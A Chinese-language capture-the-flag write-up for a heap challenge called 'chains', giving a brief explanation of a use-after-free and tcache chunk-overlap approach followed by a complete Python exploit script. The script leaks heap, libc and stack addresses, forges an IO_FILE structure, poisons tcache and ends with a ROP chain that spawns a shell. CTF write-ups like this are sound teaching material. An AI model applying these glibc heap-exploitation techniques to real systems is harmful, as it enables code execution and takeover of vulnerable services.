---
date: 2024-10-07 08:54
challenge: chains
tags:
  - UAF
---

这道题包装得比较巧妙，可以看到一些「类型混淆」的思路。其中 chains 和 proxies 的删除是独立的，但是 chains 当中会储存对 proxies 的引用，源码见 [main.c](./src/main.c)。

在取得地址泄漏后可以伪造堆块并释放进 tcache 中，获得 chunk overlap。

在最终利用中我一开始想尝试 [House of Apple]()，但是发现 0x80 的堆块大小限制与乱七八糟的堆布局（我的问题）给布置带来了一些麻烦，最终回到泄漏 environ、劫持回栈上打 ROP：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc(
    "/home/eastxuelian/config/glibc-all-in-one/libs/2.39-0ubuntu8.3_amd64/libc.so.6"
)

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b"> ")
    sl(i2b(choice))


def add_proxy(host, port):
    cmd(1)
    ru(b"[?] Enter proxy hostname: ")
    sl(host)
    ru(b"[?] Enter proxy port: ")
    sl(i2b(port))


def delete_proxy(id):
    cmd(2)
    ru(b"id")
    sl(i2b(id))


def add_chain(id_list):
    cmd(3)
    ru(b"[?] Enter chain size: ")
    sl(i2b(len(id_list)))
    for i in id_list:
        ru(b"proxy id: ")
        sl(i2b(i))


def show(id):
    cmd(4)
    ru(b"[?] Enter chain id: ")
    sl(i2b(id))


def delete_chain(id):
    cmd(5)
    ru(b"id")
    sl(i2b(id))


add_proxy(b"exl0", 0)
add_proxy(b"exl1", 0)
add_chain([0])
delete_proxy(0)
add_chain([1])
show(0)
ru(b"[*] proxy #")
ru(b"is ")
heap_base = u64_ex(ru(b":", drop=True)) - 0x370
lg("heap_base", heap_base)

add_proxy(b"exl0", 0x1337)
add_proxy(
    flat(
        {
            0x80 - 0x20: [0, 0x91],
        }
    ),
    0x1337,
)
delete_chain(0)
add_proxy(b"exl3", 0x1337)
add_proxy(p64(heap_base + 0xAE0), 0)

for i in range(9):
    add_proxy(b"xxx", 0x2333)

for i in range(8):
    delete_proxy(5 + i)

show(1)
ru(b"[*] proxy #")
ru(b"is ")
libc_base = u64_ex(ru(b":", drop=True)) - 0x203B20
lg("libc_base", libc_base)

_lock = libc_base + 0x205710
_IO_wfile_jumps = libc_base + libc.sym._IO_wfile_jumps
fake_IO_FILE = heap_base + 0x9B8

f1 = IO_FILE_plus_struct()
f1.flags = u64_ex("  sh;")
f1._lock = _lock
f1._wide_data = fake_IO_FILE
f1._mode = 1
f1.vtable = _IO_wfile_jumps

add_proxy(
    flat(
        {
            0x10 + 0x88 - 0x88: bytes(f1)[0x88:],
            # 0x10 + 0xE0 - 0x88: [heap_base + 0x4F0],
        },
        filler=b"\x00",
    ),
    0,
)
add_proxy(
    flat(
        {
            0x38 + 0x00: bytes(f1)[: 128 - 0x38],
        },
        filler=b"\x00",
    ),
    0,
)
delete_proxy(3)
delete_proxy(4)
add_proxy(flat([heap_base + 0x4D0, 0]), 0)
delete_chain(1)

add_proxy(
    flat({0x18: [0x91, (heap_base >> 12) ^ (libc_base + libc.sym._IO_2_1_stdout_), 0]}),
    0,
)
add_proxy(flat({0x68: [0xDEADBEEF]}), 0)

cmd(1)
ru(b"[?] Enter proxy hostname: ")
sl(
    flat(
        [
            0xFBAD1887,
            0,
            0,
            0,
            libc_base + libc.sym.environ - 0x20,
            libc_base + libc.sym.environ + 0x20,
        ],
        filler=b"\x00",
    ),
)
ru(b"\x00" * 0x20)
stack_base = u64_ex(rn(8)) - 0x140
lg("stack_base", stack_base)

ru(b"[?] Enter proxy port: ")
sl(i2b(0))

delete_proxy(7)
delete_proxy(4)

add_proxy(
    flat({0x18: [0x91, (heap_base >> 12) ^ (stack_base - 8), 0]}),
    0,
)
add_proxy(b"exl", 0)

pop_rdi_ret = libc_base + 0x000000000010F75B
add_proxy(
    flat(
        [
            0xDEADBEEF,
            pop_rdi_ret + 1,
            pop_rdi_ret,
            libc_base + next(libc.search(b"/bin/sh\x00")),
            libc_base + libc.sym.system,
        ]
    ),
    0,
)

ia()
```
